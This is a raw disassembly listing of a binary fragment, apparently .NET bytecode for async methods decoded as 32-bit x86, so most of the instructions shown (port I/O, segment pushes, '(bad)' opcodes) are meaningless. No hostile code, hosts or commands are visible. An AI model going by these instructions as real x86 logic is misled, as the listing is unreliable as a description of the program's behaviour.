  404d2c:	06                   	push   %es
  404d2d:	39 80 00 00 00 73    	cmp    %eax,0x73000000(%eax)
  404d33:	81 00 00 06 0c 07    	addl   $0x70c0600,(%eax)
  404d39:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  404d3c:	00 0a                	add    %cl,(%edx)
  404d3e:	2d 05 dd 96 00       	sub    $0x96dd05,%eax
  404d43:	00 00                	add    %al,(%eax)
  404d45:	1e                   	push   %ds
  404d46:	28 57 00             	sub    %dl,0x0(%edi)
  404d49:	00 06                	add    %al,(%esi)
  404d4b:	72 50                	jb     0x404d9d
  404d4d:	14 00                	adc    $0x0,%al
  404d4f:	70 28                	jo     0x404d79
  404d51:	68 00 00 0a 0d       	push   $0xd0a0000
  404d56:	08 07                	or     %al,(%edi)
  404d58:	09 28                	or     %ebp,(%eax)
  404d5a:	2b 00                	sub    (%eax),%eax
  404d5c:	00 0a                	add    %cl,(%edx)
  404d5e:	7d 50                	jge    0x404db0
  404d60:	00 00                	add    %al,(%eax)
  404d62:	04 08                	add    $0x8,%al
  404d64:	7b 50                	jnp    0x404db6
  404d66:	00 00                	add    %al,(%eax)
  404d68:	04 28                	add    $0x28,%al
  404d6a:	24 00                	and    $0x0,%al
  404d6c:	00 0a                	add    %cl,(%edx)
  404d6e:	2d 66 08 fe 06       	sub    $0x6fe0866,%eax
  404d73:	82 00 00             	addb   $0x0,(%eax)
  404d76:	06                   	push   %es
  404d77:	73 eb                	jae    0x404d64
  404d79:	00 00                	add    %al,(%eax)
  404d7b:	0a 28                	or     (%eax),%ch
  404d7d:	ec                   	in     (%dx),%al
  404d7e:	00 00                	add    %al,(%eax)
  404d80:	0a 6f ed             	or     -0x13(%edi),%ch
  404d83:	00 00                	add    %al,(%eax)
  404d85:	0a 13                	or     (%ebx),%dl
  404d87:	04 12                	add    $0x12,%al
  404d89:	04 28                	add    $0x28,%al
  404d8b:	ee                   	out    %al,(%dx)
  404d8c:	00 00                	add    %al,(%eax)
  404d8e:	0a 2d 3e 02 16 25    	or     0x2516023e,%ch
  404d94:	0a 7d 51             	or     0x51(%ebp),%bh
  404d97:	00 00                	add    %al,(%eax)
  404d99:	04 02                	add    $0x2,%al
  404d9b:	11 04 7d 55 00 00 04 	adc    %eax,0x4000055(,%edi,2)
  404da2:	02 7c 52 00          	add    0x0(%edx,%edx,2),%bh
  404da6:	00 04 12             	add    %al,(%edx,%edx,1)
  404da9:	04 02                	add    $0x2,%al
  404dab:	28 0f                	sub    %cl,(%edi)
  404dad:	00 00                	add    %al,(%eax)
  404daf:	2b de                	sub    %esi,%ebx
  404db1:	7f 02                	jg     0x404db5
  404db3:	7b 55                	jnp    0x404e0a
  404db5:	00 00                	add    %al,(%eax)
  404db7:	04 13                	add    $0x13,%al
  404db9:	04 02                	add    $0x2,%al
  404dbb:	7c 55                	jl     0x404e12
  404dbd:	00 00                	add    %al,(%eax)
  404dbf:	04 fe                	add    $0xfe,%al
  404dc1:	15 3a 00 00 01       	adc    $0x100003a,%eax
  404dc6:	02 15 25 0a 7d 51    	add    0x517d0a25,%dl
  404dcc:	00 00                	add    %al,(%eax)
  404dce:	04 12                	add    $0x12,%al
  404dd0:	04 28                	add    $0x28,%al
  404dd2:	f0 00 00             	lock add %al,(%eax)
  404dd5:	0a de                	or     %dh,%bl
  404dd7:	03 26                	add    (%esi),%esp
  404dd9:	de 00                	fiadds (%eax)
  404ddb:	02 02                	add    (%edx),%al
  404ddd:	7b 54                	jnp    0x404e33
  404ddf:	00 00                	add    %al,(%eax)
  404de1:	04 17                	add    $0x17,%al
  404de3:	58                   	pop    %eax
  404de4:	7d 54                	jge    0x404e3a
  404de6:	00 00                	add    %al,(%eax)
  404de8:	04 02                	add    $0x2,%al
  404dea:	7b 54                	jnp    0x404e40
  404dec:	00 00                	add    %al,(%eax)
  404dee:	04 02                	add    $0x2,%al
  404df0:	7b 53                	jnp    0x404e45
  404df2:	00 00                	add    %al,(%eax)
  404df4:	04 8e                	add    $0x8e,%al
  404df6:	69 3f 21 ff ff ff    	imul   $0xffffff21,(%edi),%edi
  404dfc:	02 14 7d 53 00 00 04 	add    0x4000053(,%edi,2),%dl
  404e03:	de 19                	ficomps (%ecx)
  404e05:	13 05 02 1f fe 7d    	adc    0x7dfe1f02,%eax
  404e0b:	51                   	push   %ecx
  404e0c:	00 00                	add    %al,(%eax)
  404e0e:	04 02                	add    $0x2,%al
  404e10:	7c 52                	jl     0x404e64
  404e12:	00 00                	add    %al,(%eax)
  404e14:	04 11                	add    $0x11,%al
  404e16:	05 28 f8 00 00       	add    $0xf828,%eax
  404e1b:	0a de                	or     %dh,%bl
  404e1d:	13 02                	adc    (%edx),%eax
  404e1f:	1f                   	pop    %ds
  404e20:	fe                   	(bad)
  404e21:	7d 51                	jge    0x404e74
  404e23:	00 00                	add    %al,(%eax)
  404e25:	04 02                	add    $0x2,%al
  404e27:	7c 52                	jl     0x404e7b
  404e29:	00 00                	add    %al,(%eax)
  404e2b:	04 28                	add    $0x28,%al
  404e2d:	f9                   	stc
  404e2e:	00 00                	add    %al,(%eax)
  404e30:	0a 2a                	or     (%edx),%ch
  404e32:	00 00                	add    %al,(%eax)
  404e34:	41                   	inc    %ecx
  404e35:	34 00                	xor    $0x0,%al
  404e37:	00 00                	add    %al,(%eax)
  404e39:	00 00                	add    %al,(%eax)
  404e3b:	00 30                	add    %dh,(%eax)
  404e3d:	00 00                	add    %al,(%eax)
  404e3f:	00 ac 00 00 00 dc 00 	add    %ch,0xdc0000(%eax,%eax,1)
  404e46:	00 00                	add    %al,(%eax)
  404e48:	03 00                	add    (%eax),%eax
  404e4a:	00 00                	add    %al,(%eax)
  404e4c:	1a 00                	sbb    (%eax),%al
  404e4e:	00 01                	add    %al,(%ecx)
  404e50:	00 00                	add    %al,(%eax)
  404e52:	00 00                	add    %al,(%eax)
  404e54:	07                   	pop    %es
  404e55:	00 00                	add    %al,(%eax)
  404e57:	00 02                	add    %al,(%edx)
  404e59:	01 00                	add    %eax,(%eax)
  404e5b:	00 09                	add    %cl,(%ecx)
  404e5d:	01 00                	add    %eax,(%eax)
  404e5f:	00 19                	add    %bl,(%ecx)
  404e61:	00 00                	add    %al,(%eax)
  404e63:	00 1a                	add    %bl,(%edx)
  404e65:	00 00                	add    %al,(%eax)
  404e67:	01 36                	add    %esi,(%esi)
  404e69:	02 7c 52 00          	add    0x0(%edx,%edx,2),%bh
  404e6d:	00 04 03             	add    %al,(%ebx,%eax,1)
  404e70:	28 fa                	sub    %bh,%dl
  404e72:	00 00                	add    %al,(%eax)
  404e74:	0a 2a                	or     (%edx),%ch
  404e76:	00 00                	add    %al,(%eax)
  404e78:	1b 30                	sbb    (%eax),%esi
  404e7a:	04 00                	add    $0x0,%al
  404e7c:	bd 02 00 00 34       	mov    $0x34000002,%ebp
  404e81:	00 00                	add    %al,(%eax)
  404e83:	11 02                	adc    %eax,(%edx)
  404e85:	7b 56                	jnp    0x404edd
  404e87:	00 00                	add    %al,(%eax)
  404e89:	04 0a                	add    $0xa,%al
  404e8b:	02 7b 58             	add    0x58(%ebx),%bh
  404e8e:	00 00                	add    %al,(%eax)
  404e90:	04 0b                	add    $0xb,%al
  404e92:	06                   	push   %es
  404e93:	2c 15                	sub    $0x15,%al
  404e95:	06                   	push   %es
  404e96:	17                   	pop    %ss
  404e97:	3b 08                	cmp    (%eax),%ecx
  404e99:	02 00                	add    (%eax),%al
  404e9b:	00 02                	add    %al,(%edx)
  404e9d:	14 7d                	adc    $0x7d,%al
  404e9f:	59                   	pop    %ecx
  404ea0:	00 00                	add    %al,(%eax)
  404ea2:	04 02                	add    $0x2,%al
  404ea4:	16                   	push   %ss
  404ea5:	7d 5a                	jge    0x404f01
  404ea7:	00 00                	add    %al,(%eax)
  404ea9:	04 00                	add    $0x0,%al
  404eab:	06                   	push   %es
  404eac:	26 00 06             	add    %al,%es:(%esi)
  404eaf:	39 9c 00 00 00 07 7b 	cmp    %ebx,0x7b070000(%eax,%eax,1)
  404eb6:	33 00                	xor    (%eax),%eax
  404eb8:	00 04 28             	add    %al,(%eax,%ebp,1)
  404ebb:	3c 00                	cmp    $0x0,%al
  404ebd:	00 06                	add    %al,(%esi)
  404ebf:	2c 17                	sub    $0x17,%al
  404ec1:	07                   	pop    %es
  404ec2:	7b 33                	jnp    0x404ef7
  404ec4:	00 00                	add    %al,(%eax)
  404ec6:	04 20                	add    $0x20,%al
  404ec8:	bd 01 00 00 20       	mov    $0x20000001,%ebp
  404ecd:	c8 00 00 00          	enter  $0x0,$0x0
  404ed1:	28 3d 00 00 06 2d    	sub    %bh,0x2d060000
  404ed7:	05 dd 65 01 00       	add    $0x165dd,%eax
  404edc:	00 07                	add    %al,(%edi)
  404ede:	7b 33                	jnp    0x404f13
  404ee0:	00 00                	add    %al,(%eax)
  404ee2:	04 28                	add    $0x28,%al
  404ee4:	38 00                	cmp    %al,(%eax)
  404ee6:	00 06                	add    %al,(%esi)
  404ee8:	2d 05 dd 53 01       	sub    $0x153dd05,%eax
  404eed:	00 00                	add    %al,(%eax)
  404eef:	02 7e 10             	add    0x10(%esi),%bh
  404ef2:	00 00                	add    %al,(%eax)
  404ef4:	04 7d                	add    $0x7d,%al
  404ef6:	5b                   	pop    %ebx
  404ef7:	00 00                	add    %al,(%eax)
  404ef9:	04 02                	add    $0x2,%al
  404efb:	16                   	push   %ss
  404efc:	7d 5c                	jge    0x404f5a
  404efe:	00 00                	add    %al,(%eax)
  404f00:	04 38                	add    $0x38,%al
  404f02:	1b 01                	sbb    (%ecx),%eax
  404f04:	00 00                	add    %al,(%eax)
  404f06:	02 7b 5b             	add    0x5b(%ebx),%bh
  404f09:	00 00                	add    %al,(%eax)
  404f0b:	04 02                	add    $0x2,%al
  404f0d:	7b 5c                	jnp    0x404f6b
  404f0f:	00 00                	add    %al,(%eax)
  404f11:	04 9a                	add    $0x9a,%al
  404f13:	0c 1b                	or     $0x1b,%al
  404f15:	8d 57 00             	lea    0x0(%edi),%edx
  404f18:	00 01                	add    %al,(%ecx)
  404f1a:	25 16 72 9b 16       	and    $0x169b7216,%eax
  404f1f:	00 70 a2             	add    %dh,-0x5e(%eax)
  404f22:	25 17 07 7b 33       	and    $0x337b0717,%eax
  404f27:	00 00                	add    %al,(%eax)
  404f29:	04 a2                	add    $0xa2,%al
  404f2b:	25 18 72 1b 17       	and    $0x171b7218,%eax
  404f30:	00 70 a2             	add    %dh,-0x5e(%eax)
  404f33:	25 19 08 a2 25       	and    $0x25a20819,%eax
  404f38:	1a 72 1f             	sbb    0x1f(%edx),%dh
  404f3b:	17                   	pop    %ss
  404f3c:	00 70 a2             	add    %dh,-0x5e(%eax)
  404f3f:	28 8f 00 00 0a 0d    	sub    %cl,0xd0a0000(%edi)
  404f45:	09 28                	or     %ebp,(%eax)
  404f47:	3e 00 00             	add    %al,%ds:(%eax)
  404f4a:	06                   	push   %es
  404f4b:	3a c3                	cmp    %bl,%al
  404f4d:	00 00                	add    %al,(%eax)
  404f4f:	00 00                	add    %al,(%eax)
  404f51:	06                   	push   %es
  404f52:	39 93 00 00 00 07    	cmp    %edx,0x7000000(%ebx)
  404f58:	7b 34                	jnp    0x404f8e
  404f5a:	00 00                	add    %al,(%eax)
  404f5c:	04 7b                	add    $0x7b,%al
  404f5e:	31 00                	xor    %eax,(%eax)
  404f60:	00 04 09             	add    %al,(%ecx,%ecx,1)
  404f63:	28 c3                	sub    %al,%bl
  404f65:	00 00                	add    %al,(%eax)
  404f67:	0a 09                	or     (%ecx),%cl
  404f69:	07                   	pop    %es
  404f6a:	7b 34                	jnp    0x404fa0
  404f6c:	00 00                	add    %al,(%eax)
  404f6e:	04 7b                	add    $0x7b,%al
  404f70:	31 00                	xor    %eax,(%eax)
  404f72:	00 04 28             	add    %al,(%eax,%ebp,1)
  404f75:	bb 00 00 0a 28       	mov    $0x280a0000,%ebx
  404f7a:	02 01                	add    (%ecx),%al
  404f7c:	00 0a                	add    %cl,(%edx)
  404f7e:	09 07                	or     %eax,(%edi)
  404f80:	7b 34                	jnp    0x404fb6
  404f82:	00 00                	add    %al,(%eax)
  404f84:	04 7b                	add    $0x7b,%al
  404f86:	31 00                	xor    %eax,(%eax)
  404f88:	00 04 28             	add    %al,(%eax,%ebp,1)
  404f8b:	03 01                	add    (%ecx),%eax
  404f8d:	00 0a                	add    %cl,(%edx)
  404f8f:	28 04 01             	sub    %al,(%ecx,%eax,1)
  404f92:	00 0a                	add    %cl,(%edx)
  404f94:	09 07                	or     %eax,(%edi)
  404f96:	7b 34                	jnp    0x404fcc
  404f98:	00 00                	add    %al,(%eax)
  404f9a:	04 7b                	add    $0x7b,%al
  404f9c:	31 00                	xor    %eax,(%eax)
  404f9e:	00 04 28             	add    %al,(%eax,%ebp,1)
  404fa1:	05 01 00 0a 28       	add    $0x280a0001,%eax
  404fa6:	06                   	push   %es
  404fa7:	01 00                	add    %eax,(%eax)
  404fa9:	0a 07                	or     (%edi),%al
  404fab:	7b 33                	jnp    0x404fe0
  404fad:	00 00                	add    %al,(%eax)
  404faf:	04 09                	add    $0x9,%al
  404fb1:	28 3f                	sub    %bh,(%edi)
  404fb3:	00 00                	add    %al,(%eax)
  404fb5:	06                   	push   %es
  404fb6:	6f                   	outsl  %ds:(%esi),(%dx)
  404fb7:	ed                   	in     (%dx),%eax
  404fb8:	00 00                	add    %al,(%eax)
  404fba:	0a 13                	or     (%ebx),%dl
  404fbc:	04 12                	add    $0x12,%al
  404fbe:	04 28                	add    $0x28,%al
  404fc0:	ee                   	out    %al,(%dx)
  404fc1:	00 00                	add    %al,(%eax)
  404fc3:	0a 2d 41 02 16 25    	or     0x25160241,%ch
  404fc9:	0a 7d 56             	or     0x56(%ebp),%bh
  404fcc:	00 00                	add    %al,(%eax)
  404fce:	04 02                	add    $0x2,%al
  404fd0:	11 04 7d 5d 00 00 04 	adc    %eax,0x400005d(,%edi,2)
  404fd7:	02 7c 57 00          	add    0x0(%edi,%edx,2),%bh
  404fdb:	00 04 12             	add    %al,(%edx,%edx,1)
  404fde:	04 02                	add    $0x2,%al
  404fe0:	28 10                	sub    %dl,(%eax)
  404fe2:	00 00                	add    %al,(%eax)
  404fe4:	2b dd                	sub    %ebp,%ebx
  404fe6:	56                   	push   %esi
  404fe7:	01 00                	add    %eax,(%eax)
  404fe9:	00 02                	add    %al,(%edx)
  404feb:	7b 5d                	jnp    0x40504a
  404fed:	00 00                	add    %al,(%eax)
  404fef:	04 13                	add    $0x13,%al
  404ff1:	04 02                	add    $0x2,%al
  404ff3:	7c 5d                	jl     0x405052
  404ff5:	00 00                	add    %al,(%eax)
  404ff7:	04 fe                	add    $0xfe,%al
  404ff9:	15 3a 00 00 01       	adc    $0x100003a,%eax
  404ffe:	02 15 25 0a 7d 56    	add    0x567d0a25,%dl
  405004:	00 00                	add    %al,(%eax)
  405006:	04 12                	add    $0x12,%al
  405008:	04 28                	add    $0x28,%al
  40500a:	f0 00 00             	lock add %al,(%eax)
  40500d:	0a de                	or     %dh,%bl
  40500f:	24 26                	and    $0x26,%al
  405011:	de 00                	fiadds (%eax)
  405013:	02 02                	add    (%edx),%al
  405015:	7b 5c                	jnp    0x405073
  405017:	00 00                	add    %al,(%eax)
  405019:	04 17                	add    $0x17,%al
  40501b:	58                   	pop    %eax
  40501c:	7d 5c                	jge    0x40507a
  40501e:	00 00                	add    %al,(%eax)
  405020:	04 02                	add    $0x2,%al
  405022:	7b 5c                	jnp    0x405080
  405024:	00 00                	add    %al,(%eax)
  405026:	04 02                	add    $0x2,%al
  405028:	7b 5b                	jnp    0x405085
  40502a:	00 00                	add    %al,(%eax)
  40502c:	04 8e                	add    $0x8e,%al
  40502e:	69 3f d2 fe ff ff    	imul   $0xfffffed2,(%edi),%edi
  405034:	02 14 7d 5b 00 00 04 	add    0x400005b(,%edi,2),%dl
  40503b:	de 03                	fiadds (%ebx)
  40503d:	26 de 00             	fiadds %es:(%eax)
  405040:	de 15 02 17 7d 5a    	ficoms 0x5a7d1702
  405046:	00 00                	add    %al,(%eax)
  405048:	04 de                	add    $0xde,%al
  40504a:	0c 13                	or     $0x13,%al
  40504c:	05 02 11 05 7d       	add    $0x7d051102,%eax
  405051:	59                   	pop    %ecx
  405052:	00 00                	add    %al,(%eax)
  405054:	04 de                	add    $0xde,%al
  405056:	00 7e 0f             	add    %bh,0xf(%esi)
  405059:	00 00                	add    %al,(%eax)
  40505b:	04 20                	add    $0x20,%al
  40505d:	c8 00 00 00          	enter  $0x0,$0x0
  405061:	20 58 02             	and    %bl,0x2(%eax)
  405064:	00 00                	add    %al,(%eax)
  405066:	6f                   	outsl  %ds:(%esi),(%dx)
  405067:	39 00                	cmp    %eax,(%eax)
  405069:	00 0a                	add    %cl,(%edx)
  40506b:	28 fb                	sub    %bh,%bl
  40506d:	00 00                	add    %al,(%eax)
  40506f:	0a 6f ed             	or     -0x13(%edi),%ch
  405072:	00 00                	add    %al,(%eax)
  405074:	0a 13                	or     (%ebx),%dl
  405076:	04 12                	add    $0x12,%al
  405078:	04 28                	add    $0x28,%al
  40507a:	ee                   	out    %al,(%dx)
  40507b:	00 00                	add    %al,(%eax)
  40507d:	0a 2d 41 02 17 25    	or     0x25170241,%ch
  405083:	0a 7d 56             	or     0x56(%ebp),%bh
  405086:	00 00                	add    %al,(%eax)
  405088:	04 02                	add    $0x2,%al
  40508a:	11 04 7d 5d 00 00 04 	adc    %eax,0x400005d(,%edi,2)
  405091:	02 7c 57 00          	add    0x0(%edi,%edx,2),%bh
  405095:	00 04 12             	add    %al,(%edx,%edx,1)
  405098:	04 02                	add    $0x2,%al
  40509a:	28 10                	sub    %dl,(%eax)
  40509c:	00 00                	add    %al,(%eax)
  40509e:	2b dd                	sub    %ebp,%ebx
  4050a0:	9c                   	pushf
  4050a1:	00 00                	add    %al,(%eax)
  4050a3:	00 02                	add    %al,(%edx)
  4050a5:	7b 5d                	jnp    0x405104
  4050a7:	00 00                	add    %al,(%eax)
  4050a9:	04 13                	add    $0x13,%al
  4050ab:	04 02                	add    $0x2,%al
  4050ad:	7c 5d                	jl     0x40510c
  4050af:	00 00                	add    %al,(%eax)
  4050b1:	04 fe                	add    $0xfe,%al
  4050b3:	15 3a 00 00 01       	adc    $0x100003a,%eax
  4050b8:	02 15 25 0a 7d 56    	add    0x567d0a25,%dl
  4050be:	00 00                	add    %al,(%eax)
  4050c0:	04 12                	add    $0x12,%al
  4050c2:	04 28                	add    $0x28,%al
  4050c4:	f0 00 00             	lock add %al,(%eax)
  4050c7:	0a 07                	or     (%edi),%al
  4050c9:	7b 34                	jnp    0x4050ff
  4050cb:	00 00                	add    %al,(%eax)
  4050cd:	04 7b                	add    $0x7b,%al
  4050cf:	32 00                	xor    (%eax),%al
  4050d1:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4050d4:	07                   	pop    %es
  4050d5:	01 00                	add    %eax,(%eax)
  4050d7:	0a 26                	or     (%esi),%ah
  4050d9:	02 7b 59             	add    0x59(%ebx),%bh
  4050dc:	00 00                	add    %al,(%eax)
  4050de:	04 13                	add    $0x13,%al
  4050e0:	05 11 05 2c 17       	add    $0x172c0511,%eax
  4050e5:	11 05 75 1a 00 00    	adc    %eax,0x1a75
  4050eb:	01 25 2d 03 11 05    	add    %esp,0x511032d
  4050f1:	7a 28                	jp     0x40511b
  4050f3:	08 01                	or     %al,(%ecx)
  4050f5:	00 0a                	add    %cl,(%edx)
  4050f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4050f8:	09 01                	or     %eax,(%ecx)
  4050fa:	00 0a                	add    %cl,(%edx)
  4050fc:	02 7b 5a             	add    0x5a(%ebx),%bh
  4050ff:	00 00                	add    %al,(%eax)
  405101:	04 13                	add    $0x13,%al
  405103:	06                   	push   %es
  405104:	11 06                	adc    %eax,(%esi)
  405106:	17                   	pop    %ss
  405107:	33 02                	xor    (%edx),%eax
  405109:	de 22                	fisubs (%edx)
  40510b:	02 14 7d 59 00 00 04 	add    0x4000059(,%edi,2),%dl
  405112:	de 19                	ficomps (%ecx)
  405114:	13 07                	adc    (%edi),%eax
  405116:	02 1f                	add    (%edi),%bl
  405118:	fe                   	(bad)
  405119:	7d 56                	jge    0x405171
  40511b:	00 00                	add    %al,(%eax)
  40511d:	04 02                	add    $0x2,%al
  40511f:	7c 57                	jl     0x405178
  405121:	00 00                	add    %al,(%eax)
  405123:	04 11                	add    $0x11,%al
  405125:	07                   	pop    %es
  405126:	28 f8                	sub    %bh,%al
  405128:	00 00                	add    %al,(%eax)
  40512a:	0a de                	or     %dh,%bl
  40512c:	13 02                	adc    (%edx),%eax
  40512e:	1f                   	pop    %ds
  40512f:	fe                   	(bad)
  405130:	7d 56                	jge    0x405188
  405132:	00 00                	add    %al,(%eax)
  405134:	04 02                	add    $0x2,%al
  405136:	7c 57                	jl     0x40518f
  405138:	00 00                	add    %al,(%eax)
  40513a:	04 28                	add    $0x28,%al
  40513c:	f9                   	stc
  40513d:	00 00                	add    %al,(%eax)
  40513f:	0a 2a                	or     (%edx),%ch
  405141:	00 00                	add    %al,(%eax)
  405143:	00 41 64             	add    %al,0x64(%ecx)
  405146:	00 00                	add    %al,(%eax)
  405148:	00 00                	add    %al,(%eax)
  40514a:	00 00                	add    %al,(%eax)
  40514c:	cd 00                	int    $0x0
  40514e:	00 00                	add    %al,(%eax)
  405150:	bf 00 00 00 8c       	mov    $0x8c000000,%edi
  405155:	01 00                	add    %eax,(%eax)
  405157:	00 03                	add    %al,(%ebx)
  405159:	00 00                	add    %al,(%eax)
  40515b:	00 13                	add    %dl,(%ebx)
  40515d:	00 00                	add    %al,(%eax)
  40515f:	01 00                	add    %eax,(%eax)
  405161:	00 00                	add    %al,(%eax)
  405163:	00 2a                	add    %ch,(%edx)
  405165:	00 00                	add    %al,(%eax)
  405167:	00 8f 01 00 00 b9    	add    %cl,-0x46ffffff(%edi)
  40516d:	01 00                	add    %eax,(%eax)
  40516f:	00 03                	add    %al,(%ebx)
  405171:	00 00                	add    %al,(%eax)
  405173:	00 13                	add    %dl,(%ebx)
  405175:	00 00                	add    %al,(%eax)
  405177:	01 00                	add    %eax,(%eax)
  405179:	00 00                	add    %al,(%eax)
  40517b:	00 27                	add    %ah,(%edi)
  40517d:	00 00                	add    %al,(%eax)
  40517f:	00 a0 01 00 00 c7    	add    %ah,-0x38ffffff(%eax)
  405185:	01 00                	add    %eax,(%eax)
  405187:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40518a:	00 00                	add    %al,(%eax)
  40518c:	13 00                	adc    (%eax),%eax
  40518e:	00 01                	add    %al,(%ecx)
  405190:	00 00                	add    %al,(%eax)
  405192:	00 00                	add    %al,(%eax)
  405194:	0e                   	push   %cs
  405195:	00 00                	add    %al,(%eax)
  405197:	00 82 02 00 00 90    	add    %al,-0x6ffffffe(%edx)
  40519d:	02 00                	add    (%eax),%al
  40519f:	00 19                	add    %bl,(%ecx)
  4051a1:	00 00                	add    %al,(%eax)
  4051a3:	00 1a                	add    %bl,(%edx)
  4051a5:	00 00                	add    %al,(%eax)
  4051a7:	01 36                	add    %esi,(%esi)
  4051a9:	02 7c 57 00          	add    0x0(%edi,%edx,2),%bh
  4051ad:	00 04 03             	add    %al,(%ebx,%eax,1)
  4051b0:	28 fa                	sub    %bh,%dl
  4051b2:	00 00                	add    %al,(%eax)
  4051b4:	0a 2a                	or     (%edx),%ch
  4051b6:	00 00                	add    %al,(%eax)
  4051b8:	1b 30                	sbb    (%eax),%esi
  4051ba:	03 00                	add    (%eax),%eax
  4051bc:	22 02                	and    (%edx),%al
  4051be:	00 00                	add    %al,(%eax)
  4051c0:	35 00 00 11 02       	xor    $0x2110000,%eax
  4051c5:	7b 5e                	jnp    0x405225
  4051c7:	00 00                	add    %al,(%eax)
  4051c9:	04 0a                	add    $0xa,%al
  4051cb:	06                   	push   %es
  4051cc:	18 42 d6             	sbb    %al,-0x2a(%edx)
  4051cf:	01 00                	add    %eax,(%eax)
  4051d1:	00 00                	add    %al,(%eax)
  4051d3:	06                   	push   %es
  4051d4:	45                   	inc    %ebp
  4051d5:	03 00                	add    (%eax),%eax
  4051d7:	00 00                	add    %al,(%eax)
  4051d9:	55                   	push   %ebp
  4051da:	00 00                	add    %al,(%eax)
  4051dc:	00 05 01 00 00 77    	add    %al,0x77000001
  4051e2:	01 00                	add    %eax,(%eax)
  4051e4:	00 7e 1c             	add    %bh,0x1c(%esi)
  4051e7:	00 00                	add    %al,(%eax)
  4051e9:	04 20                	add    $0x20,%al
  4051eb:	80 ee 36             	sub    $0x36,%dh
  4051ee:	00 20                	add    %ah,(%eax)
  4051f0:	00 dd                	add    %bl,%ch
  4051f2:	6d                   	insl   (%dx),%es:(%edi)
  4051f3:	00 6f 39             	add    %ch,0x39(%edi)
  4051f6:	00 00                	add    %al,(%eax)
  4051f8:	0a 7e 1e             	or     0x1e(%esi),%bh
  4051fb:	00 00                	add    %al,(%eax)
  4051fd:	04 6f                	add    $0x6f,%al
  4051ff:	d2 00                	rolb   %cl,(%eax)
  405201:	00 0a                	add    %cl,(%edx)
  405203:	28 0a                	sub    %cl,(%edx)
  405205:	01 00                	add    %eax,(%eax)
  405207:	0a 6f ed             	or     -0x13(%edi),%ch
  40520a:	00 00                	add    %al,(%eax)
  40520c:	0a 0c 12             	or     (%edx,%edx,1),%cl
  40520f:	02 28                	add    (%eax),%ch
  405211:	ee                   	out    %al,(%dx)
  405212:	00 00                	add    %al,(%eax)
  405214:	0a 2d 3f 02 16 25    	or     0x2516023f,%ch
  40521a:	0a 7d 5e             	or     0x5e(%ebp),%bh
  40521d:	00 00                	add    %al,(%eax)
  40521f:	04 02                	add    $0x2,%al
  405221:	08 7d 61             	or     %bh,0x61(%ebp)
  405224:	00 00                	add    %al,(%eax)
  405226:	04 02                	add    $0x2,%al
  405228:	7c 5f                	jl     0x405289
  40522a:	00 00                	add    %al,(%eax)
  40522c:	04 12                	add    $0x12,%al
  40522e:	02 02                	add    (%edx),%al
  405230:	28 11                	sub    %dl,(%ecx)
  405232:	00 00                	add    %al,(%eax)
  405234:	2b dd                	sub    %ebp,%ebx
  405236:	ab                   	stos   %eax,%es:(%edi)
  405237:	01 00                	add    %eax,(%eax)
  405239:	00 02                	add    %al,(%edx)
  40523b:	7b 61                	jnp    0x40529e
  40523d:	00 00                	add    %al,(%eax)
  40523f:	04 0c                	add    $0xc,%al
  405241:	02 7c 61 00          	add    0x0(%ecx,%eiz,2),%bh
  405245:	00 04 fe             	add    %al,(%esi,%edi,8)
  405248:	15 3a 00 00 01       	adc    $0x100003a,%eax
  40524d:	02 15 25 0a 7d 5e    	add    0x5e7d0a25,%dl
  405253:	00 00                	add    %al,(%eax)
  405255:	04 12                	add    $0x12,%al
  405257:	02 28                	add    (%eax),%ch
  405259:	f0 00 00             	lock add %al,(%eax)
  40525c:	0a 7e 1c             	or     0x1c(%esi),%bh
  40525f:	00 00                	add    %al,(%eax)
  405261:	04 20                	add    $0x20,%al
  405263:	30 75 00             	xor    %dh,0x0(%ebp)
  405266:	00 20                	add    %ah,(%eax)
  405268:	90                   	nop
  405269:	5f                   	pop    %edi
  40526a:	01 00                	add    %eax,(%eax)
  40526c:	6f                   	outsl  %ds:(%esi),(%dx)
  40526d:	39 00                	cmp    %eax,(%eax)
  40526f:	00 0a                	add    %cl,(%edx)
  405271:	0b 02                	or     (%edx),%eax
  405273:	28 0b                	sub    %cl,(%ebx)
  405275:	01 00                	add    %eax,(%eax)
  405277:	0a 0d 12 03 07 6c    	or     0x6c070312,%cl
  40527d:	28 3c 00             	sub    %bh,(%eax,%eax,1)
  405280:	00 0a                	add    %cl,(%edx)
  405282:	7d 60                	jge    0x4052e4
  405284:	00 00                	add    %al,(%eax)
  405286:	04 38                	add    $0x38,%al
  405288:	f3 00 00             	repz add %al,(%eax)
  40528b:	00 1b                	add    %bl,(%ebx)
  40528d:	8d 27                	lea    (%edi),%esp
  40528f:	00 00                	add    %al,(%eax)
  405291:	01 13                	add    %edx,(%ebx)
  405293:	04 16                	add    $0x16,%al
  405295:	13 05 2b 10 11 04    	adc    0x411102b,%eax
  40529b:	11 05 28 51 00 00    	adc    %eax,0x5128
  4052a1:	06                   	push   %es
  4052a2:	a2 11 05 17 58       	mov    %al,0x58170511
  4052a7:	13 05 11 05 11 04    	adc    0x4110511,%eax
  4052ad:	8e 69 32             	mov    0x32(%ecx),%gs
  4052b0:	e8 11 04 28 0c       	call   0xc6856c6
  4052b5:	01 00                	add    %eax,(%eax)
  4052b7:	0a 6f ed             	or     -0x13(%edi),%ch
  4052ba:	00 00                	add    %al,(%eax)
  4052bc:	0a 0c 12             	or     (%edx,%edx,1),%cl
  4052bf:	02 28                	add    (%eax),%ch
  4052c1:	ee                   	out    %al,(%dx)
  4052c2:	00 00                	add    %al,(%eax)
  4052c4:	0a 2d 3f 02 17 25    	or     0x2517023f,%ch
  4052ca:	0a 7d 5e             	or     0x5e(%ebp),%bh
  4052cd:	00 00                	add    %al,(%eax)
  4052cf:	04 02                	add    $0x2,%al
  4052d1:	08 7d 61             	or     %bh,0x61(%ebp)
  4052d4:	00 00                	add    %al,(%eax)
  4052d6:	04 02                	add    $0x2,%al
  4052d8:	7c 5f                	jl     0x405339
  4052da:	00 00                	add    %al,(%eax)
  4052dc:	04 12                	add    $0x12,%al
  4052de:	02 02                	add    (%edx),%al
  4052e0:	28 11                	sub    %dl,(%ecx)
  4052e2:	00 00                	add    %al,(%eax)
  4052e4:	2b dd                	sub    %ebp,%ebx
  4052e6:	fb                   	sti
  4052e7:	00 00                	add    %al,(%eax)
  4052e9:	00 02                	add    %al,(%edx)
  4052eb:	7b 61                	jnp    0x40534e
  4052ed:	00 00                	add    %al,(%eax)
